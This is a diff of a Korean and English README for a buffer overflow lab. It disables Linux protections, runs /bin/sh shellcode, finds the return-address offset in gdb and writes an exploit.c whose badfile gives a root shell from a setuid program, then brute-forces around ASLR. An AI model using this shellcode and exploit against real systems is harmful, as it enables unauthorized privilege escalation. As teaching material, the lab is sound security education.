@@ -18,6 +18,8 @@ The goal of our labs is to help students focus on (1) grasping security principl
 
 <br/>
 
+<br/>
+
 ## Buffer Overflow Vulnerability Lab
 
 ### Overview
@@ -32,6 +34,8 @@ This vulnerability arises due to the mixing of the storage for data (e.g. buffer
 
 <br/>
 
+<br/>
+
 ### Turning Off Countermeasures
 
 - **Address Space Randomization**
@@ -42,6 +46,11 @@ This vulnerability arises due to the mixing of the storage for data (e.g. buffer
     $ sudo sysctl -w kernel.randomize_va_space=0
     kernel.randomize_va_space = 0
     ```
+    
+  - <p align="center">
+        <img src="README.assets/BufferOverflow0.png"/>
+        <div align="center">kernel.randomize_va_space = 0</div>
+    </p>
 
 - **The StackGuard Protection Scheme**
 
@@ -52,6 +61,8 @@ This vulnerability arises due to the mixing of the storage for data (e.g. buffer
     ```
 
 - **Non-Executable Stack**
+
+  - Ubuntu used to allow executable stacks, but this has now changed: the binary images of programs (and shared libraries) must declare whether they require executable stacks or not, i.e., they need to mark a field in the program header. Kernel or dynamic linker uses this marking to decide whether to make the stack of this running program executable or non-executable. This marking is done automatically by the recent versions of gcc, and by default, the stack is set to be non-executable. To change that, use the following option when compiling programs:
 
   - ```bash
     # For executable stack:
@@ -69,17 +80,29 @@ This vulnerability arises due to the mixing of the storage for data (e.g. buffer
 
 <br/>
 
+<br/>
+
 ### Running Shellcode
 
 ```c
+/* shellcode.c */
+
 #include <stdio.h>
 int main() {
     char*name[2];
+    //name[0] = "/bin/zsh";
     name[0] = "/bin/sh";
     name[1] = NULL;
     execve(name[0], name, NULL);
 }
 ```
+
+<p align="center">
+    <img src="README.assets/BufferOverflow-shellcode.png"/>
+    <div align="center">shellcode.c Result</div>
+</p>
+
+<br/>
 
 ```c
 /* call_shellcode.c */
@@ -91,15 +114,18 @@ int main() {
 
 const char code[] =
     "\x31\xc0" /* Line 1: xorl %eax,%eax */
-    "\x50" /* Line 2: pushl %eax */ "\x68"
-    "//sh" /* Line 3: pushl $0x68732f2f */ "\x68"
-    "/bin" /* Line 4: pushl $0x6e69622f */ "\x89\xe3" /* Line 5: movl %esp,%ebx */
-    "\x50"                                            /* Line 6: pushl %eax */
-    "\x53"                                            /* Line 7: pushl %ebx */
-    "\x89\xe1"                                        /* Line 8: movl %esp,%ecx */
-    "\x99"                                            /* Line 9: cdq */
-    "\xb0\x0b"                                        /* Line 10: movb $0x0b,%al */
-    "\xcd\x80"                                        /* Line 11: int $0x80 */
+    "\x50"     /* Line 2: pushl %eax */
+    "\x68"
+    "//sh" /* Line 3: pushl $0x68732f2f */
+    "\x68"
+    "/bin"     /* Line 4: pushl $0x6e69622f */
+    "\x89\xe3" /* Line 5: movl %esp,%ebx */
+    "\x50"     /* Line 6: pushl %eax */
+    "\x53"     /* Line 7: pushl %ebx */
+    "\x89\xe1" /* Line 8: movl %esp,%ecx */
+    "\x99"     /* Line 9: cdq */
+    "\xb0\x0b" /* Line 10: movb $0x0b,%al */
+    "\xcd\x80" /* Line 11: int $0x80 */
     ;
 
 int main(int argc, char **argv)
@@ -110,7 +136,7 @@ int main(int argc, char **argv)
 }
 ```
 
-```
+```bash
 $ gcc -o call_shellcode -z execstack -fno-stack-protector call_shellcode.c
 ```
 
@@ -118,10 +144,35 @@ $ gcc -o call_shellcode -z execstack -fno-stack-protector call_shellcode.c
     <img src="README.assets/BufferOverflow1.png"/>
     <div align="center">call_shellcode.c Result</div>
 </p>
+<br/>
 
 <br/>
 
 ### The Vulnerable Program
+
+버퍼 오버플로우를 발생시킬 수 있는 적절한 `badfile`을 생성한다. 이후, `badfile`을 읽는 취약한 프로그램을 실행시키면 `badfile`을 읽고 버퍼 오버플로우를 발생시킨다.
+
+이를 위해 (1) return address가 어디에 저장되어 있는지 알아야하고, (2) shellcode가 어디에 저장될지 알아야 한다.
+
+이를 위해서는 스택 레이아웃을 이해해야 하는데, 아래는 그러한 예시를 그림으로 나타낸 것이다.
+
+<p align="center">
+    <img src="README.assets/BufferOverflow-finding.png"/>
+    <div align="center">Finding the address of the memory.</div>
+</p>
+
+위 그림에서 처럼 `buffer[]` 배열의 주소를 알아낼 수 잇다면, return address가 저장된 위치를 계산할 수 있다.
+
+결국, `buffer[]`의 주소를 정확히 계산할 수 잇따면, 악성 코드의 시작점 또한 정확히 계산하는 것이 가능하다.
+
+주소를 정확하게 계산할 수 없는 경우(원격 프로그램)일 지라도 여전히 추측이 가능하다.
+
+이러한 공격이 성공할 수 있는 기회를 늘리기 위해서, 다수의 NOP들을 악성 코드의 시작점에 추가할 수 있다.
+
+<p align="center">
+    <img src="README.assets/BufferOverflow-storing.png"/>
+    <div align="center">Storing an long integer in buffer.</div>
+</p>
 
 ```c
 /* Vunlerable program: stack.c */
@@ -169,6 +220,34 @@ $ sudo chmod 4755 stack
 
 <br/>
 
+**Run debugger**
+
+```bash
+$ gdb stack
+$ b bof
+$ r
+```
+
+<p align="center">
+    <img src="README.assets/BufferOverflow2.png"/>
+    <div align="center">Run debugger</div>
+</p>
+
+Now in order to find the return address we need to find the address of **ebp**.
+
+After, finding the address of **ebp** we need to find the starting address of buffer.
+
+Finally, we calculate offset.
+
+*0x188(HEX) = 392(DEC)*
+
+<p align="center">
+    <img src="README.assets/BufferOverflow3.png"/>
+    <div align="center">Print address</div>
+</p>
+
+<br/>
+
 ```c
 /* exploit.c */
 
@@ -178,7 +257,8 @@ $ sudo chmod 4755 stack
 #include <string.h>
 
 char shellcode[] = "\x31\xc0" /*Line1:xorl%eax,%eax*/
-                   "\x50" /*Line2:pushl%eax*/ "\x68"
+                   "\x50"     /*Line2:pushl%eax*/
+                   "\x68"
                    "//sh" /*Line3:pushl$0x68732f2f*/
                    "\x68"
                    "/bin"     /*Line4:pushl$0x6e69622f*/
@@ -198,7 +278,7 @@ void main(int argc, char **argv)
     memset(&buffer, 0x90, 517);
 
     /* You need to fill the buffer with appropriate contents here */
-    *((long *)(buffer + 36)) = 0xbfffeb08 + 0x88;
+    *((long *)(buffer + 396)) = 0xbfffef58 + 0x88;
     memcpy(buffer + sizeof(buffer) - sizeof(shellcode), shellcode, sizeof(shellcode));
 
     /* Save the contents to the file "badfile" */
@@ -207,6 +287,10 @@ void main(int argc, char **argv)
     fclose(badfile);
 }
 ```
+
+여기서 ebp 주소에 0x88(128)을 추가한다.
+
+공격 시 버퍼 크기가 517이며, 그 중 396바이트는 스택에서 사용하고 25바이트는 셸 코드로 사용되므로 그 사이에 값을 추가하여 NOP 코드가 포함된 주소로 현재 반환 주소를 대체할 수 있다.
 
 ```bash
 $ gcc -o exploit exploit.c
@@ -217,3 +301,37 @@ $ ./stack
 root
 ```
 
+<p align="center">
+    <img src="README.assets/BufferOverflow4.png"/>
+    <div align="center">Exploit Success</div>
+</p>
+
+<br/>
+
+<br/>
+
+### Turn on the Ubuntu's Address Randomization
+
+```bash
+$ sudo sysctl -w kernel.randomize_va_space=2
+```
+
+If running the vulnerable code once does not get you the root shell, how about running it for many times?
+
+You can run `./stack` in the following loop, and see what will happen.
+
+If your exploit program is designed properly, you should be able to get the root shell after a while.
+
+You can modify your exploit program to increase the probability of success (i.e., reduce the time that you have to wait).
+
+```bash
+$ sh -c "while [ 1 ]; do ./stack; done;"
+
+# whoami
+root
+```
+
+<p align="center">
+    <img src="README.assets/BufferOverflow5.png"/>
+    <div align="center">Turn on the Ubuntu's Address Randomization</div>
+</p>
